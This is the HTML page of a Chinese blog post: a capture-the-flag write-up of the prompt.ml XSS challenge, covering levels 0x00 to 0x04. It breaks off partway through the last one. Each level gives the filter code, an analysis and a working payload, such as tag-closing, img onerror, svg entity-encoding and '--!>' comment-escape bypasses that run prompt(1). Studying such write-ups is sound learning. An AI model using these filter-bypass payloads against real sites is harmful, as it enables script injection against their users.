@@ -1,0 +1,3165 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="MUZIBing">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="MUZIBing">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>This_1s_pr0mpt.ml_writeup · MUZIBing&#39;s BLOG</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: 'BN8DBA0DBN',
+                apiKey: '743de843b152b923f8db5d51eac38a27',
+                indexName: 'search',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">MUZIBing&#39;s BLOG</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">This_1s_pr0mpt.ml_writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">MUZIBing's BLOG</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/96.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            This_1s_pr0mpt.ml_writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="xss">xss</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/02/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>这是我在无意中遇到的一个<code>xss</code> 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于n<a href="%5Bhttps://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/%5D(https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/)">浏览器编码问题</a>，我将近用了三天的时间才搞清楚；当然还有很多知识点就不在这一一列举了，但是我会在下文中逐一进行详解。这些都不是重点，我想说的是，通过这个网站的学习，让我对 <code>xss</code> 的原理、攻击和防御都有了新的了解，这次我就借这次做题，详细系统的再总结一下 <code>xss</code> 知识点，当然这并不意味着结束了 <code>xss</code> 的学习，这只不过是一个开头，好了！步入正题。</p>
+</blockquote>
+<h3 id="font-color-navy0x00-简单闭合问题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-简单闭合问题font"></a> <font color="navy">0x00 简单闭合问题</font></h3>
+<h4 id="1-js-代码"><a class="markdownIt-Anchor" href="#1-js-代码"></a> <code>① JS 代码</code></h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析"><a class="markdownIt-Anchor" href="#2-题目分析"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p>通过题目中给出的 JS 代码，可以得到：JS 直接将我们的输入进行 <code>escape</code> 编码（该方法不会对<code>ASCII 字母</code>和<code>数字进行编码</code>，也不会对<code>* @ - _ + . /</code>。其他所有的字符都会被转义序列替换），并没有经过过滤条件，相当于直接返回<code>input</code> 的输入。因为被编码后的字符还会被 JavaScript 解析器重新解析。</p>
+</blockquote>
+<h4 id="3-相关知识点"><a class="markdownIt-Anchor" href="#3-相关知识点"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li><code>escape</code> 函数的用法</li>
+<li>浏览器 <code>JavaScript</code> 解析器的编码</li>
+</ol>
+</blockquote>
+<h4 id="4-payload"><a class="markdownIt-Anchor" href="#4-payload"></a> <code>④ payload</code></h4>
+<blockquote>
+<p>根据上述分析，我们可以这样构造 <code>payload</code>：</p>
+<p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;//</code></p>
+<p>注：在做过第五题后，有人（比如我）可能会想这里可不可以用 <code>type=image</code> 覆盖 <code>&lt;input&gt;</code> 标中的 <code>type</code> 值，再通过 <code>onerror</code> 或者 <code>onload</code> 执行 <code>prompt(1)</code>呢？尝试之后会发现并不可行，因为<code>以第一次出现的为结果</code>。</p>
+</blockquote>
+<h4 id="5-html-source"><a class="markdownIt-Anchor" href="#5-html-source"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//"&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型"><a class="markdownIt-Anchor" href="#6-xss-类型"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>简单的标签闭合类型</p>
+</blockquote>
+<h3 id="font-color-navy0x01-单标签绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-单标签绕过font"></a> <font color="navy">0x01 单标签绕过</font></h3>
+<h4 id="1-js-代码-2"><a class="markdownIt-Anchor" href="#1-js-代码-2"></a> <code>① JS 代码</code></h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-2"><a class="markdownIt-Anchor" href="#2-题目分析-2"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p><code>/gi</code> 标识全局搜索匹配、不区分大小写。将匹配的替换为空，因此不能出现 <code>&lt;</code> 和 <code>&gt;</code> 不能同时出现。由于一个标签即使没有最后面的 <code>&gt;</code> 也是可以被浏览器正确解析的。或者最后使用 <code>//</code></p>
+</blockquote>
+<h4 id="3-相关知识点-2"><a class="markdownIt-Anchor" href="#3-相关知识点-2"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li>JavaScript 中的 <code>replace</code> 函数知识点：
+<ul>
+<li>和 <code>python</code> 中的 <code>replace</code> 的区别</li>
+<li>它的一些特性，将会在下文中接触</li>
+</ul>
+</li>
+<li><code>&lt;img&gt;</code> 标签的 <code>onload</code> 和 <code>onerror</code> 的区别</li>
+</ol>
+</blockquote>
+<h4 id="4-payload-2"><a class="markdownIt-Anchor" href="#4-payload-2"></a> <code>④ payload</code></h4>
+<blockquote>
+<p><code>onload</code> 有关的 payload：</p>
+<p>注：<code>onload</code> 事件会在页面或图像加载完成后立即发生。</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://muzibing.github.io/images/95-1.png"</span> <span class="attr">onload</span>=<span class="string">prompt(1)</span> //</span></span><br><span class="line">&lt;body onload="prompt(1)"</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>onerror</code> 有关的 payload：</p>
+<p>注：<code>onerror</code> 事件当错误发生时运行脚本。</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span> = <span class="string">prompt(1)</span> //  (<span class="attr">src</span>引用的图片不存在则执行<span class="attr">onerror</span>事件）</span></span><br><span class="line">&lt;input src = # type = "image" onerror = prompt(1) //</span><br></pre></td></tr></table></figure>
+<h4 id="5-html-source-2"><a class="markdownIt-Anchor" href="#5-html-source-2"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onload:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="https://muzibing.github.io/images/95-1.png" onload=prompt(1) //&lt;/article&gt;</span><br><span class="line">&lt;article&gt;&lt;body onload="prompt(1)"&lt;/article&gt;</span><br><span class="line">    </span><br><span class="line">onerror:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="#" onerror = prompt(1) //&lt;/article&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">src</span> = <span class="string">#</span> <span class="attr">type</span> = <span class="string">"image"</span> <span class="attr">onerror</span> = <span class="string">"prompt(1)"</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-2"><a class="markdownIt-Anchor" href="#6-xss-类型-2"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>通过标签特性绕过正则表达式的过滤，再利用标签的事件，来达到 xss 攻击目的。</p>
+</blockquote>
+<h3 id="font-color-navy0x02-实体编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-实体编码绕过font"></a> <font color="navy">0x02 实体编码绕过</font></h3>
+<h4 id="1-js-代码-3"><a class="markdownIt-Anchor" href="#1-js-代码-3"></a> <code>① JS 代码</code></h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-3"><a class="markdownIt-Anchor" href="#2-题目分析-3"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p>JS 代码的作用是将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。</p>
+</blockquote>
+<h4 id="3-相关知识点-3"><a class="markdownIt-Anchor" href="#3-相关知识点-3"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li><code>escape</code> 函数的作用</li>
+<li><code>&lt;svg&gt;</code> 的特性</li>
+</ol>
+</blockquote>
+<h4 id="4-payload-3"><a class="markdownIt-Anchor" href="#4-payload-3"></a> <code>④ payload</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>上面的 <code>payload</code> 是通过 <code>&lt;svg&gt;</code> 标签的特性，在 <code>JS 解析器</code> 解码之前，<code>HTML 解析</code> 会将 <code>&lt;svg&gt;</code> 字符串中中的实体编码解码，所以能够执行成功。</p>
+<p>注：本人憨批了一把，当时想既然可以用 <code>HTML</code> 实体字符绕过，那么可不可以用 <code>URL 编码</code> 或者   <code>JavaScript 编码</code> 呢？第二个想法真的相当于憨批了，因为 <code>escape</code> 函数就是用来解码 <code>JavaScript 编码</code> 的，肯定不能绕过呀！第一个想法还靠点谱，还想了一个 <code>payload</code>：</p>
+<p><code>&lt;a href = &quot;javascript:prompt%281%29&quot;&gt;test&lt;/a&gt;</code></p>
+<p>看着还挺靠谱，可是已经忘了给定了匹配规则：将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。所以 <code>=</code> 在这里就被清除了。</p>
+</blockquote>
+<h4 id="5-html-source-3"><a class="markdownIt-Anchor" href="#5-html-source-3"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-3"><a class="markdownIt-Anchor" href="#6-xss-类型-3"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>实体编码绕过。当然也有 <code>URL</code> 和 <code>JS</code> 编码绕过，这个得根据实际来看。</p>
+</blockquote>
+<h3 id="font-color-navy0x03-闭合注释font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-闭合注释font"></a> <font color="navy">0x03 闭合注释</font></h3>
+<h4 id="1-js-代码-4"><a class="markdownIt-Anchor" href="#1-js-代码-4"></a> <code>① JS 代码</code></h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-4"><a class="markdownIt-Anchor" href="#2-题目分析-4"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p>JS 代码通过 <code>replace</code> 函数的替换规则，将 <code>-&gt;</code> 替换为 <code>_</code>，但是这道题目就是为了逃逸出 <code>&lt;!-- --&gt;</code> 注释，那么应该怎么逃出来呢？</p>
+</blockquote>
+<h4 id="3-相关知识点-4"><a class="markdownIt-Anchor" href="#3-相关知识点-4"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li><code>&lt;!-- --&gt;</code> 和 <code>&lt;!-- --!&gt;</code> 的功能以及区别
+<ul>
+<li>html注释支持以下两种方式：
+<ul>
+<li><code>&lt;!-- xxx --&gt;</code></li>
+<li><code>&lt;!-- xxx --!&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<h4 id="4-payload-4"><a class="markdownIt-Anchor" href="#4-payload-4"></a> <code>④ payload</code></h4>
+<blockquote>
+<p>根据<code>相关知识点</code>，我们可以这样构造 payload：</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure>
+<h4 id="5-html-source-4"><a class="markdownIt-Anchor" href="#5-html-source-4"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-4"><a class="markdownIt-Anchor" href="#6-xss-类型-4"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>这是一道闭合注释类型的题目，后面还有两道。</p>
+</blockquote>
+<h3 id="font-color-navy0x04-url-编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-url-编码绕过font"></a> <font color="navy">0x04 URL 编码绕过</font></h3>
+<h4 id="1-js-代码-5"><a class="markdownIt-Anchor" href="#1-js-代码-5"></a> <code>① JS 代码</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-5"><a class="markdownIt-Anchor" href="#2-题目分析-5"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p>先看这一行：</p>
+<p><code>if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {}</code></p>
+<p>说明输入一定要符合正则表达式中的格式：</p>
+<p><code>http(s可有可无)://prompt.ml/</code></p>
+<p>如果输入字符串的部分（i）格式符合上述格式，JS 代码接着就会建立 <code>&lt;script&gt;</code> 标签，并且它的 <code>src</code> 属性等于输入的网址，然后返回的是网页上的输出内容。所以我们需要引入外部文件中的脚本中要含有：<code>prompt(1)</code>。</p>
+</blockquote>
+<h4 id="3-相关知识点-5"><a class="markdownIt-Anchor" href="#3-相关知识点-5"></a> <code>③ 相关知识点</code></h4>
